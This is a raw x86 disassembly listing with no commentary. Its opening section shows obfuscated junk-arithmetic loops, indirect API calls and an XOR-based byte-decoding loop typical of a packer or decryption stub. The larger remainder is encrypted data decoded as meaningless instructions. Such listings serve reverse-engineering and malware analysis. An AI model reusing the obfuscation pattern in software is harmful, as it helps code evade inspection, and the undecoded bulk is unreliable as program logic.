  4102f9:	sub    DWORD PTR ds:0x433867,0x43381f
  410303:	xor    al,0x46
  410305:	xor    DWORD PTR ds:0x433863,0x433817
  41030f:	sub    al,0x38
  410311:	mov    BYTE PTR [ecx],al
  410313:	movzx  ecx,WORD PTR ds:0x4337d7
  41031a:	sub    DWORD PTR ds:0x43379f,ecx
  410320:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  410327:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  41032e:	and    DWORD PTR ds:0x4337db,0x0
  410338:	mov    ecx,DWORD PTR ds:0x4337db
  41033e:	inc    ecx
  41033f:	mov    DWORD PTR ds:0x4337db,ecx
  410345:	cmp    DWORD PTR ds:0x4337db,0x25
  41034c:	jne    0x410362
  410352:	push   0x43392f
  410357:	push   0x43396f
  41035c:	call   DWORD PTR ds:0x4120f4
  410362:	cmp    DWORD PTR ds:0x4337db,0x16
  410369:	jb     0x410338
  41036f:	adc    DWORD PTR ds:0x43381f,edx
  410375:	mov    eax,DWORD PTR [ebp-0x8]
  410378:	and    DWORD PTR ds:0x433893,0x0
  410382:	mov    ecx,DWORD PTR ds:0x433893
  410388:	inc    ecx
  410389:	mov    DWORD PTR ds:0x433893,ecx
  41038f:	cmp    DWORD PTR ds:0x433893,0xf
  410396:	jne    0x4103ac
  41039c:	push   0x433867
  4103a1:	push   0x178b
  4103a6:	call   DWORD PTR ds:0x412378
  4103ac:	cmp    DWORD PTR ds:0x433893,0xe
  4103b3:	jne    0x4103c8
  4103b9:	xor    ecx,ecx
  4103bb:	xor    ecx,DWORD PTR ds:0x433893
  4103c1:	inc    ecx
  4103c2:	mov    DWORD PTR ds:0x433893,ecx
  4103c8:	cmp    DWORD PTR ds:0x433893,0x1b
  4103cf:	jb     0x410382
  4103d5:	sub    DWORD PTR ds:0x4337df,edx
  4103db:	mov    ecx,0x7510854
  4103e0:	push   esi
  4103e1:	and    DWORD PTR ds:0x4337d7,0x0
  4103eb:	jmp    0x4103ff
  4103f0:	xor    esi,esi
  4103f2:	add    esi,DWORD PTR ds:0x4337d7
  4103f8:	inc    esi
  4103f9:	mov    DWORD PTR ds:0x4337d7,esi
  4103ff:	cmp    DWORD PTR ds:0x4337d7,0x1d
  410406:	jae    0x410427
  41040c:	cmp    DWORD PTR ds:0x4337d7,0x26
  410413:	jne    0x410422
  410419:	push   DWORD PTR [ebp-0x24]
  41041c:	call   DWORD PTR ds:0x4122b4
  410422:	jmp    0x4103f0
  410427:	xor    eax,ecx
  410429:	mov    esi,0x32729b
  41042e:	add    eax,esi
  410430:	jmp    0x41043d
  410435:	mov    dl,BYTE PTR [ebp-0x1]
  410438:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  41043c:	inc    eax
  41043d:	cmp    eax,0x40
  410440:	jb     0x410435
  410446:	mov    edx,DWORD PTR [ebp-0x8]
  410449:	mov    eax,DWORD PTR [ebp-0xc]
  41044c:	xor    edx,ecx
  41044e:	add    edx,esi
  410450:	cmp    edx,eax
  410452:	je     0x410766
  410458:	push   ebx
  410459:	push   edi
  41045a:	mov    edi,DWORD PTR [ebp+0x8]
  41045d:	mov    eax,0x8a3c
  410462:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410467:	mov    edi,0x3b02
  41046c:	add    ax,di
  41046f:	movzx  eax,ax
  410472:	mov    DWORD PTR [ebp-0x14],eax
  410475:	mov    eax,DWORD PTR [ebp+0x8]
  410478:	movzx  eax,WORD PTR [eax+edx*4]
  41047c:	xor    eax,0x8a3c
  410481:	add    eax,edi
  410483:	mov    edi,DWORD PTR [ebp-0x14]
  410486:	mov    BYTE PTR [ebp+edi*1-0x58],al
  41048a:	jmp    0x410758
  41048f:	cdq    
  410490:	outs   dx,BYTE PTR ds:[esi]
  410491:	mov    ds:0xa1f17118,eax
  410496:	outs   dx,DWORD PTR ds:[esi]
  410497:	or     BYTE PTR [edx],bl
  410499:	push   es
  41049a:	out    0xe3,al
  41049c:	sti    
  41049d:	sbb    BYTE PTR ds:0x7e7eb0dc,cl
  4104a3:	scas   eax,DWORD PTR es:[edi]
  4104a4:	jl     0x410524
  4104a6:	jle    0x41050d
  4104a8:	or     BYTE PTR [esi+eiz*8],0xdc
  4104ac:	imul   edx,DWORD PTR [ebx],0xffffffc0
  4104af:	dec    esi
  4104b0:	fstp   TBYTE PTR [ebx]
  4104b2:	push   ss
  4104b3:	jb     0x41047a
  4104b5:	dec    ebx
  4104b6:	mov    bh,0xa3
  4104b8:	sbb    esi,ebp
  4104ba:	js     0x410456
  4104bc:	mov    ah,0xb9
  4104be:	call   0x97a7:0x92c4ce33
  4104c5:	scas   eax,DWORD PTR es:[edi]
  4104c6:	ja     0x4104d5
  4104c8:	repnz fnstsw WORD PTR [eax+0x2b]
  4104cc:	mov    ebp,0xae1a5032
  4104d1:	into   
  4104d2:	mov    ebx,0xda7a854a
  4104d7:	int    0x50
  4104d9:	pop    ds
  4104da:	inc    esp
  4104db:	pusha  
  4104dc:	fild   DWORD PTR [ebp-0x275ff395]
  4104e2:	cmp    ebx,DWORD PTR [ebp-0x18]
  4104e5:	sar    eax,1
  4104e7:	out    dx,eax
  4104e8:	sub    edi,ebx
  4104ea:	xor    al,BYTE PTR ds:0x952731bd
  4104f0:	hlt    
  4104f1:	out    0x90,al
  4104f3:	shl    BYTE PTR ds:0xfa865a0c,1
  4104f9:	call   0xe035d2c
  4104fe:	stos   DWORD PTR es:[edi],eax
  4104ff:	add    eax,0x828e391f
  410504:	sub    DWORD PTR [edi-0x14],edx
  410507:	pop    esp
  410508:	les    edi,FWORD PTR [ebx]
  41050a:	in     eax,0xca
  41050c:	add    al,0x1c
  41050e:	mov    WORD PTR [edi+0x30],ds
  410511:	loope  0x410591
  410513:	call   DWORD PTR [ecx-0x67]
  410516:	cmp    BYTE PTR [ecx-0x28],0xd8
  41051a:	pop    esi
  41051b:	test   eax,0xc314dbd3
  410520:	add    BYTE PTR [ebx-0x2f],al
  410523:	mov    ebp,0x8ea9565f
  410528:	lods   al,BYTE PTR ds:[esi]
  410529:	xchg   ebp,eax
  41052a:	cwde   
  41052b:	(bad)  
  41052c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41052d:	aam    0x7f
  41052f:	mov    ah,0x99
  410531:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410532:	iret   
  410533:	adc    dl,BYTE PTR [edx]
  410535:	mov    ?,WORD PTR [esi+0x5ae6d093]
  41053b:	sub    ebx,ecx
  41053d:	push   esp
  41053e:	ins    BYTE PTR es:[edi],dx
  41053f:	inc    ebp
  410540:	pop    eax
  410541:	fdiv   DWORD PTR [ecx+0x54093458]
  410547:	mov    dh,0x65
  410549:	out    dx,eax
  41054a:	inc    esi
  41054b:	and    al,0x7b
  41054d:	jmp    0x5519:0x8a31d4b5
  410554:	outs   dx,DWORD PTR ds:[esi]
  410555:	or     al,0x92
  410557:	cmp    dh,bl
  410559:	xor    BYTE PTR [eax],bl
  41055b:	mov    al,BYTE PTR ds:0x50a31cac
  410561:	out    0x7b,al
  410563:	jnp    0x4105d7
  410565:	mov    BYTE PTR [ebx-0x30],ah
  410568:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410569:	lods   al,BYTE PTR ds:[esi]
  41056a:	and    BYTE PTR [edx-0x39],ah
  41056d:	or     eax,0x8afa65a
  410572:	xchg   esp,eax
  410573:	push   edi
  410574:	push   ebx
  410575:	(bad)  [edi]
  410577:	jmp    FWORD PTR [ecx+0x7835e46e]
  41057d:	mov    ah,0x60
  410580:	mov    esi,0x172274d7
  410585:	inc    ebx
  410586:	mov    eax,DWORD PTR [ebp+0xcb0a7bd]
  41058c:	pop    ebp
  41058d:	gs dec ebx
  41058f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410590:	shl    BYTE PTR [ebx+ebx*4],0xf1
  410594:	lods   al,BYTE PTR ds:[esi]
  410595:	ss pop ds
  410597:	mov    ch,0x9d
  410599:	mov    al,0x56
  41059b:	mov    BYTE PTR [esi+0x1],cl
  41059e:	(bad)  [eax]
  4105a0:	pop    ss
  4105a1:	sub    ebp,DWORD PTR [eax+0x65]
  4105a4:	dec    ecx
  4105a5:	pop    esp
  4105a6:	inc    esi
  4105a7:	xor    BYTE PTR [ebp-0x53f77370],al
  4105ad:	outs   dx,BYTE PTR ds:[esi]
  4105ae:	loopne 0x4105a6
  4105b0:	pop    ss
  4105b1:	retf   0x93ad
  4105b4:	sbb    BYTE PTR [edx-0x6365d780],al
  4105ba:	jb     0x410626
  4105bc:	repnz loop 0x41055f
  4105bf:	mov    ds:0x9b34b248,al
  4105c4:	jae    0x41055f
  4105c6:	loop   0x41056d
  4105c8:	shr    ch,1
  4105ca:	pop    edx
  4105cb:	inc    eax
  4105cc:	mov    edx,0x904128ab
  4105d1:	sti    
  4105d2:	or     dl,BYTE PTR [ecx+ebx*1]
  4105d5:	in     eax,dx
  4105d6:	add    al,0x4a
  4105d8:	jmp    0xba90:0x94c16cf5
  4105df:	test   DWORD PTR [edx],esi
  4105e1:	fild   DWORD PTR [ebx-0x5]
  4105e4:	mov    ebp,eax
  4105e6:	out    0xbb,al
  4105e8:	push   esi
  4105e9:	popf   
  4105ea:	push   cs
  4105eb:	mov    eax,ds:0x29d7c41e
  4105f0:	fcom   DWORD PTR [esi]
  4105f2:	jbe    0x4105eb
  4105f4:	cld    
  4105f5:	dec    ecx
  4105f6:	add    al,bh
  4105f8:	mov    esi,0x4155403
  4105fd:	pop    edx
  4105fe:	(bad)  
  4105ff:	cmp    al,0x9e
  410601:	dec    eax
  410602:	popf   
  410603:	sbb    eax,0xe85dec54
  410608:	sbb    BYTE PTR [eax+ecx*8],bl
  41060b:	mov    ebp,0x88fdb025
  410610:	xor    edx,DWORD PTR [ecx+ebx*8+0x5b]
  410614:	fst    DWORD PTR [ebp+0x7c50fa4e]
  41061a:	cmc    
  41061b:	repnz shl eax,cl
  41061e:	mov    dh,0x60
  410620:	dec    edi
  410621:	cmp    DWORD PTR [ebp+0x60],ecx
  410624:	pop    eax
  410625:	or     DWORD PTR [ebx+eax*2-0x4d331d58],esi
  41062c:	(bad)  
  41062d:	cmp    cl,BYTE PTR [ecx+0x67fb3218]
  410633:	dec    edx
  410634:	pop    ebx
  410635:	mov    ds:0xbe8fc5e7,al
  41063a:	jo     0x4105fd
  41063c:	popa   
  41063d:	dec    esp
  41063e:	pop    esi
  41063f:	adc    al,0x48
  410641:	retf   0x52ec
  410644:	and    BYTE PTR [eax+0x36],ah
  410647:	stos   DWORD PTR es:[edi],eax
  410648:	add    esi,esp
  41064a:	sub    BYTE PTR [ebp-0x58577b6d],cl
  410650:	inc    ebx
  410651:	pop    ecx
  410652:	jmp    0xf455:0xeff4a0ae
  410659:	cmp    eax,0x4fdbf878
  41065e:	xlat   BYTE PTR ds:[ebx]
  41065f:	or     cl,al
  410661:	fucomi st,st(3)
  410663:	call   0x5c8f2293
  410668:	les    ecx,FWORD PTR [edi+0x2e]
  41066b:	std    
  41066c:	jb     0x410660
  41066e:	xor    BYTE PTR [edx-0x636bc1ee],ah
  410674:	mov    dh,BYTE PTR [ecx+esi*8+0x300b5908]
  41067b:	shl    BYTE PTR [ebx],1
  41067d:	and    BYTE PTR [ebx],al
  41067f:	push   edi
  410680:	enter  0xdcca,0x97
  410684:	and    DWORD PTR [eax-0x26],esi
  410687:	xor    al,bl
  410689:	in     eax,dx
  41068a:	mov    al,dl
  41068c:	mov    ebx,0x85738f06
  410691:	push   0x2b461ac5
  410696:	mov    al,0xb0
  410698:	(bad)  
  410699:	mov    bh,0x91
  41069b:	(bad)  
  41069c:	ss push esp
  41069e:	jp     0x41066c
  4106a0:	xor    eax,0xe5953aa7
  4106a5:	in     al,0x8b
  4106a7:	xchg   esp,eax
  4106a8:	pop    es
  4106a9:	pop    ecx
  4106aa:	gs mov esi,0x76a8dfd0
  4106b0:	dec    esi
  4106b1:	or     eax,0x57aed72b
  4106b6:	dec    ebp
  4106b7:	dec    esi
  4106b8:	aas    
  4106b9:	mov    ds:0xace99034,al
  4106be:	sbb    bh,BYTE PTR [ebx-0x13f1a4a8]
  4106c4:	or     edi,DWORD PTR [edi]
  4106c6:	and    esi,eax
  4106c8:	mov    bl,0xff
  4106ca:	or     eax,0x7e8ec8da
  4106cf:	icebp  
  4106d0:	(bad)  
  4106d1:	mov    ah,0x4d
  4106d3:	sub    DWORD PTR [ebp+0x2b],ebp
  4106d6:	out    0x70,al
  4106d8:	cmp    eax,0xbd13d8af
  4106dd:	adc    DWORD PTR [edi-0x3b2c7002],ecx
  4106e3:	cmp    ecx,edi
  4106e5:	or     esi,eax
  4106e7:	cmp    eax,DWORD PTR [ecx+eiz*1+0x6b]
  4106eb:	cmp    DWORD PTR [edi+0x75],ecx
  4106ee:	aaa    
  4106ef:	fild   DWORD PTR [ebp-0x34d928c7]
  4106f5:	pop    ecx
  4106f6:	push   ecx
  4106f7:	xchg   ecx,eax
  4106f8:	repnz lods al,BYTE PTR ds:[esi]
  4106fa:	ret    
  4106fb:	or     ecx,DWORD PTR [esi+esi*8]
  4106fe:	fcmovnu st,st(2)
  410700:	repnz pop ecx
  410702:	push   ebp
  410703:	pop    ebp
  410704:	stos   BYTE PTR es:[edi],al
  410705:	xchg   edi,eax
  410706:	sub    ebx,edx
  410708:	fcomi  st,st(5)
  41070a:	adc    eax,DWORD PTR [ecx+0x60]
  41070d:	fstp   DWORD PTR [eax+eax*2]
  410710:	mov    ebp,fs
  410712:	lds    edx,FWORD PTR [eax+0xc]
  410715:	scas   al,BYTE PTR es:[edi]
  410716:	test   BYTE PTR [edx+ecx*8+0x6cd1ff6d],bh
  41071d:	(bad)
  410721:	dec    esi
  410722:	loopne 0x410708
  410724:	imul   edi,eax,0x7a
  410727:	int    0x9f
  410729:	sbb    ah,BYTE PTR [edi+0x6e98b308]
  41072f:	cmc    
  410730:	sar    DWORD PTR [ebx+0x7c80a0ba],0xee
  410737:	jo     0x410730
  410739:	daa    
  41073a:	mov    esi,0x2e545a1f
  41073f:	sub    al,0xea
  410741:	jmp    0x96d9:0xc7652683
  410748:	les    ecx,FWORD PTR [edi]
  41074a:	out    dx,al
  41074b:	in     eax,0x9
  41074d:	lahf   
  41074e:	fldenv [eax+eax*1]
  410751:	sbb    bh,BYTE PTR [ebp-0x4afb21d4]
  410757:	xchg   DWORD PTR [ebx+0x3b42f445],ecx
  41075d:	ror    BYTE PTR [edi],1
  41075f:	test   esi,esi
  410761:	cld    
  410762:	(bad)  
  410763:	call   FWORD PTR [edi+0x5b]
  410766:	mov    eax,DWORD PTR [ebp-0x8]
  410769:	mov    edx,DWORD PTR [ebp+0x10]
  41076c:	xor    eax,ecx
  41076e:	jmp    0x410a3c
  410773:	mov    ds:0x6929ab51,eax
  410778:	icebp  
  410779:	mov    eax,ds:0x2251d751
  41077e:	and    eax,0xe4e313d1
  410783:	or     eax,0xaf7e7ebf
  410788:	jl     0x410808
  41078a:	jle    0x41075f
  41078c:	or     al,BYTE PTR [bx+si]
  41078f:	push   ecx
  410790:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410791:	inc    ecx
  410792:	repnz pop edx
  410794:	dec    ebp
  410795:	sbb    DWORD PTR [eax+0x4a11cce3],esi
  41079b:	xor    DWORD PTR [edi],ebp
  41079d:	dec    ecx
  41079e:	mov    ch,0x3e
  4107a0:	sbb    eax,edi
  4107a2:	push   0xb0c08850
  4107a7:	(bad)  
  4107a8:	(bad)  [edx-0x5c]
  4107ab:	xor    BYTE PTR [ebx-0x60],0xa8
  4107af:	xchg   BYTE PTR [edx+0x5ff14e28],bl
  4107b5:	adc    edx,DWORD PTR [edi]
  4107b7:	mov    al,ds:0x4554d54d
  4107bc:	mov    dl,0x43
  4107be:	test   al,0x5c
  4107c0:	jp     0x4107ad
  4107c2:	enter  0x9d46,0xd0
  4107c6:	in     eax,0x8a
  4107c8:	adc    dl,BYTE PTR [eax-0x3e6eef9c]
  4107ce:	add    al,0x76
  4107d0:	jge    0x4107a3
  4107d2:	pop    esi
  4107d3:	xor    edx,eax
  4107d5:	scas   al,BYTE PTR es:[edi]
  4107d6:	imul   ebx,DWORD PTR [edi],0x5650177f
  4107dc:	scas   eax,DWORD PTR es:[edi]
  4107dd:	sub    BYTE PTR [edi+0x6d],al
  4107e0:	sub    eax,0xd8e7350b
  4107e5:	add    bh,BYTE PTR [ebx+0x77933ebc]
  4107eb:	(bad)  
  4107ec:	mov    ebx,0xc513bd2e
  4107f1:	push   ecx
  4107f2:	jle    0x41081e
  4107f4:	pop    edi
  4107f5:	dec    DWORD PTR [esi-0x21]
  4107f8:	cmp    bh,BYTE PTR [ebp-0x7f]
  4107fb:	sbb    eax,0xf2699b8b
  410800:	icebp  
  410801:	push   es
  410802:	or     bl,BYTE PTR [ebp+0x12]
  410805:	xchg   edi,eax
  410806:	stos   BYTE PTR es:[edi],al
  410807:	and    al,0xed
  410809:	push   edi
  41080a:	push   ebp
  41080b:	mov    ecx,0xf40b0ff2
  410810:	xor    esp,DWORD PTR [ebx]
  410812:	xlat   BYTE PTR ds:[ebx]
  410813:	(bad)  
  410814:	test   eax,0x19ecb76b
  410819:	jb     0x41086e
  41081b:	xchg   edx,eax
  41081c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41081d:	push   eax
  41081e:	inc    esi
  41081f:	(bad)  
  410820:	adc    DWORD PTR [edi],ecx
  410822:	adc    al,BYTE PTR ds:0x72a64987
  410828:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410829:	sbb    dh,BYTE PTR [eax]
  41082b:	inc    eax
  41082c:	push   ecx
  41082d:	les    ebp,FWORD PTR [edx-0x37]
  410830:	xchg   edi,eax
  410831:	inc    ebp
  410832:	and    DWORD PTR [edx],edx
  410834:	stc    
  410835:	pop    edi
  410836:	call   0x3a4e13a0
  41083b:	pushf  
  41083c:	mov    esp,0xc8712fe9
  410841:	mov    DWORD PTR [eax-0x19],ebp
  410844:	pop    eax
  410845:	lods   al,BYTE PTR ds:[esi]
  410846:	mov    ds:0xca2098bb,eax
  41084b:	inc    ebx
  41084c:	ja     0x4108c7
  41084e:	xchg   edi,eax
  41084f:	leave  
  410850:	fnstsw WORD PTR [ecx]
  410852:	push   ebx
  410853:	xchg   DWORD PTR [ebp+edx*2+0x64],esp
  410857:	mov    ds:0x81965267,al
  41085c:	leave  
  41085d:	pop    ebx
  41085e:	std    
  41085f:	mov    esi,0x52da30dc
  410864:	cli    
  410865:	out    0x2e,al
  410867:	or     edi,DWORD PTR [ebx-0x115426cd]
  41086d:	mov    esp,0x8ef1f0ce
  410872:	jge    0x410894
  410874:	and    al,0x7
  410876:	leave  
  410877:	sub    eax,0x27bd294d
  41087c:	and    ah,BYTE PTR gs:[edx]
  41087f:	adc    DWORD PTR es:[esi],ebx
  410882:	outs   dx,DWORD PTR ds:[esi]
  410883:	popa   
  410884:	sbb    al,0x1f
  410886:	jne    0x4108ba
  410888:	outs   dx,BYTE PTR ds:[esi]
  410889:	inc    eax
  41088a:	mov    ebp,0x36a4f597
  41088f:	stos   BYTE PTR es:[edi],al
  410890:	les    esi,FWORD PTR [ecx-0x6b1ab70c]
  410896:	test   BYTE PTR [esi*4+0x7f3cf823],bh
  41089d:	jbe    0x41091e
  41089f:	jno    0x4108e6
  4108a1:	sub    DWORD PTR [edi+0x6c7fe572],edi
  4108a7:	stos   DWORD PTR es:[edi],eax
  4108a8:	push   ecx
  4108a9:	sub    DWORD PTR [edx+0x30],0x20
  4108ad:	cmp    edi,DWORD PTR fs:[ebx+0x10fff0b7]
  4108b4:	push   ecx
  4108b5:	mov    ebx,DWORD PTR [eax+ebx*8]
  4108b8:	inc    ebx
  4108b9:	(bad)
  4108bc:	cmp    eax,0x2a6f23ca
  4108c1:	lock adc ah,BYTE PTR [edi+0x13dd4c1e]
  4108c8:	push   ecx
  4108c9:	lea    ebx,[ebp+0x70d5730]
  4108cf:	fnstcw WORD PTR [ebx+0xd]
  4108d2:	lea    esp,[edx+ebp*1+0x2da349c2]
  4108d9:	aad    0xbf
  4108db:	lahf   
  4108dc:	sahf   
  4108dd:	add    al,0x57
  4108df:	and    BYTE PTR [ebx-0x5cd9a317],0x6f
  4108e6:	add    bh,0x96
  4108e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108ea:	mov    esi,0x637b0ebe
  4108ef:	nop
  4108f0:	mov    esp,0x16873363
  4108f5:	push   0xffffffd1
  4108f7:	mov    bl,0xce
  4108f9:	lds    ebx,FWORD PTR [ebp+0x70]
  4108fc:	ins    DWORD PTR es:[edi],dx
  4108fd:	inc    esp
  4108fe:	mov    dh,0x1f
  410900:	jge    0x4108b7
  410902:	sub    eax,0xff56a06
  410907:	pop    es
  410908:	sahf   
  410909:	es ins DWORD PTR es:[edi],dx
  41090b:	scas   al,BYTE PTR es:[edi]
  41090c:	adc    eax,0x2d4893a
  410911:	in     al,dx
  410912:	adc    BYTE PTR [edx-0x20],dh
  410915:	sub    al,0xee
  410917:	in     al,dx
  410918:	dec    edx
  410919:	fucom  st(1)
  41091b:	dec    esp
  41091c:	add    DWORD PTR [ebp+0x72],0x337df1b9
  410923:	dec    ebp
  410924:	dec    edi
  410925:	arpl   WORD PTR cs:[ebx*8+0x591ded4a],bp
  41092d:	sub    al,0x1c
  41092f:	adc    eax,0x4dd27a2d
  410934:	ret    
  410935:	or     ah,BYTE PTR [eax+ebp*8+0x27]
  410939:	je     0x41092e
  41093b:	pop    ebp
  41093c:	add    DWORD PTR [ecx],eax
  41093e:	jb     0x4109b2
  410940:	sub    ebp,0x4cee1fba
  410946:	test   DWORD PTR [edi],ecx
  410948:	scas   al,BYTE PTR es:[edi]
  410949:	xchg   cl,bh
  41094b:	jno    0x4108cf
  41094d:	or     eax,0x3345dddd
  410953:	mov    eax,0x6793f20a
  410958:	jmp    0x521f:0xd8450bd4
  41095f:	dec    eax
  410960:	test   BYTE PTR [ecx+0xb5e05a3],0x5a
  410967:	inc    esp
  410968:	mov    dl,0x11
  41096a:	adc    ch,bh
  41096c:	clc    
  41096d:	push   0xb67e9f11
  410972:	std    
  410973:	je     0x410910
  410975:	dec    ebx
  410976:	xor    esi,DWORD PTR [edi+0x2f77614c]
  41097c:	cmp    eax,DWORD PTR [esi-0x1740cfe9]
  410982:	jbe    0x410971
  410984:	lock mov esp,0xc9bd212d
  41098a:	mov    dh,0x50
  41098c:	mov    DWORD PTR [edx+0x4d],ecx
  41098f:	out    0xb7,eax
  410991:	lods   al,BYTE PTR ds:[esi]
  410992:	ret    0x92b8
  410995:	pushf  
  410996:	cmp    cl,BYTE PTR [eax-0x7a]
  410999:	adc    BYTE PTR [ecx-0x2c],bl
  41099c:	jmp    0xdd9fc78e
  4109a1:	test   al,0xa9
  4109a3:	cdq    
  4109a4:	mov    ds:0x825ed063,eax
  4109a9:	sub    ebp,ebp
  4109ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109ac:	sub    edx,ebx
  4109ae:	mov    edi,0x917386d2
  4109b3:	sbb    al,BYTE PTR [ecx+ebx*8]
  4109b6:	(bad)  
  4109b7:	scas   al,BYTE PTR es:[edi]
  4109b8:	xor    al,BYTE PTR [esi+ecx*8+0x7e2003c5]
  4109bf:	jl     0x4109e8
  4109c1:	add    al,0xaf
  4109c3:	mov    WORD PTR [ecx],fs
  4109c5:	mov    ds:0xb8a85139,eax
  4109ca:	pop    ebp
  4109cb:	jmp    0x4109f5
  4109cd:	stos   DWORD PTR es:[edi],eax
  4109ce:	retf   0x371d
  4109d1:	pop    ebp
  4109d2:	std    
  4109d3:	sub    al,0x37
  4109d5:	pop    esi
  4109d6:	inc    edi
  4109d7:	loope  0x410a09
  4109d9:	int3   
  4109da:	pop    es
  4109db:	clc    
  4109dc:	int    0x47
  4109de:	xchg   ebx,eax
  4109df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109e0:	xor    eax,0x38b094
  4109e5:	retf   0x1552
  4109e8:	dec    edx
  4109e9:	das    
  4109ea:	aad    0x34
  4109ec:	aam    0x44
  4109ee:	or     edi,DWORD PTR [ebx-0x4a]
  4109f1:	jp     0x410a6b
  4109f3:	(bad)  
  4109f4:	jo     0x410a67
  4109f6:	out    0x67,eax
  4109f8:	xchg   ebx,eax
  4109f9:	test   eax,0x5b054d4
  4109fe:	push   edx
  4109ff:	and    ebx,DWORD PTR [edx]
  410a01:	les    esi,FWORD PTR [eax+edi*4+0xa]
  410a05:	push   ds
  410a06:	addr16 add eax,0x2cb3f5ce
  410a0c:	pop    ebx
  410a0d:	or     al,0x42
  410a0f:	mov    eax,0x3a97ae4d
  410a14:	stos   DWORD PTR es:[edi],eax
  410a15:	jae    0x4109f2
  410a17:	push   eax
  410a18:	(bad)  
  410a19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a1a:	sahf   
  410a1b:	pushf  
  410a1c:	pop    esi
  410a1d:	pop    eax
  410a1e:	ds lock cmp eax,0x1b6da1b6
  410a25:	gs push esi
  410a27:	pop    edx
  410a28:	scas   eax,DWORD PTR es:[edi]
  410a29:	rcr    BYTE PTR [esi],1
  410a2b:	into   
  410a2c:	push   ebx
  410a2d:	inc    ecx
  410a2e:	fisttp QWORD PTR [ebx]
  410a30:	push   es
  410a31:	(bad)  
  410a32:	loop   0x410aa1
  410a34:	mov    esi,0xa5f5284f
  410a39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a3a:	test   al,0xc6
  410a3c:	add    eax,esi
  410a3e:	jmp    0x410d0c
  410a43:	add    dh,BYTE PTR [edx]
  410a45:	fdiv   QWORD PTR fs:[eax+ebp*2-0x7e]
  410a4a:	lock pop eax
  410a4c:	(bad)  
  410a4d:	xchg   esp,eax
  410a4e:	pop    esi
  410a4f:	pop    ebx
  410a50:	(bad)  
  410a51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a52:	mov    dx,0x7ebd
  410a56:	jle    0x410a07
  410a58:	jl     0x410ad8
  410a5a:	jle    0x410a83
  410a5c:	int3   
  410a5d:	mov    ds:0x943f5b1c,al
  410a62:	dec    edi
  410a63:	xchg   BYTE PTR [ebx+0x2826328],dl
  410a69:	or     al,0x22
  410a6b:	or     eax,0x49e73ee4
  410a70:	push   esp
  410a71:	or     edi,DWORD PTR [ebx+0xd0976d9]
  410a77:	mul    BYTE PTR [edi-0x66]
  410a7a:	or     al,0x61
  410a7c:	bswap  esp
  410a7e:	sub    DWORD PTR [edi-0x1e22bd45],ebp
  410a84:	mov    esi,0x82577129
  410a89:	fstp   DWORD PTR [eax+0x5a]
  410a8c:	scas   al,BYTE PTR es:[edi]
  410a8d:	into   
  410a8e:	mov    al,ds:0x62f158
  410a93:	jb     0x410b02
  410a95:	out    0x8a,al
  410a97:	daa    
  410a98:	je     0x410a55
  410a9a:	ds in  al,dx
  410a9c:	retf   0x7602
  410a9f:	jmp    0x75cd:0x26305ed
  410aa6:	ret    
  410aa7:	xchg   esi,eax
  410aa8:	push   edi
  410aa9:	sahf   
  410aaa:	sbb    DWORD PTR [ebx-0x74cf9fa3],0xffffff92
  410ab1:	dec    eax
  410ab2:	cmp    ah,BYTE PTR [ebp-0x69]
  410ab5:	ins    BYTE PTR es:[edi],dx
  410ab6:	aas    
  410ab7:	imul   ecx,DWORD PTR [ebx],0xb
  410aba:	pop    ebp
  410abb:	mov    ah,bl
  410abd:	sbb    dl,cl
  410abf:	jge    0x410af3
  410ac1:	sub    al,0xba
  410ac3:	mov    ebx,0x6b86b0d9
  410ac8:	sbb    ah,al
  410aca:	adc    eax,0x399442cc
  410acf:	loope  0x410ad9
  410ad1:	cmp    eax,0x9202439d
  410ad6:	(bad)  
  410ad7:	and    BYTE PTR [edx+0x458f2e90],al
  410add:	jnp    0x410a64
  410adf:	xchg   BYTE PTR [edx+ebx*2],bl
  410ae2:	aas    
  410ae3:	loop   0x410ad7
  410ae5:	stos   DWORD PTR es:[edi],eax
  410ae6:	lock out dx,al
  410ae8:	fistp  QWORD PTR [eax+0x30]
  410aeb:	mov    bh,0xbc
  410aed:	dec    ebp
  410aee:	das    
  410aef:	sub    ecx,0x65
  410af2:	jmp    0xb145:0x90b9512c
  410af9:	loope  0x410b5a
  410afb:	or     eax,DWORD PTR [eax-0x60]
  410afe:	jmp    0x275b4c17
  410b03:	int3   
  410b04:	jmp    0xdcb3:0x640c2d2d
  410b0b:	in     al,0x88
  410b0d:	pop    ds
  410b0e:	mov    bl,0x86
  410b10:	and    ecx,ecx
  410b12:	sti    
  410b13:	in     eax,0x87
  410b15:	rcl    al,cl
  410b17:	cmp    ebx,ebp
  410b19:	cmp    ah,bl
  410b1b:	aam    0x9c
  410b1d:	sbb    BYTE PTR [ecx-0x4f],al
  410b20:	mov    ch,0x60
  410b22:	ss test eax,0x13adc3af
  410b28:	mov    fs:0x3ffd6d35,eax
  410b2e:	xchg   ebx,eax
  410b2f:	xlat   BYTE PTR ds:[ebx]
  410b30:	jo     0x410b54
  410b32:	push   0x68edc052
  410b37:	jns    0x410ae1
  410b39:	mov    eax,ds:0x15207845
  410b3e:	mov    edx,0xe37a2d02
  410b43:	stos   BYTE PTR es:[edi],al
  410b44:	sbb    ebp,DWORD PTR [edx*8-0x3c792f2d]
  410b4b:	(bad)  
  410b4c:	mul    DWORD PTR [eax-0x58]
  410b4f:	cmp    eax,0x46b706bd
  410b54:	in     eax,dx
  410b55:	les    ecx,FWORD PTR [edx+eiz*8-0x1d]
  410b59:	(bad)  
  410b5a:	cmp    ecx,DWORD PTR [esi-0x32]
  410b5d:	gs dec esp
  410b5f:	inc    esp
  410b60:	js     0x410b26
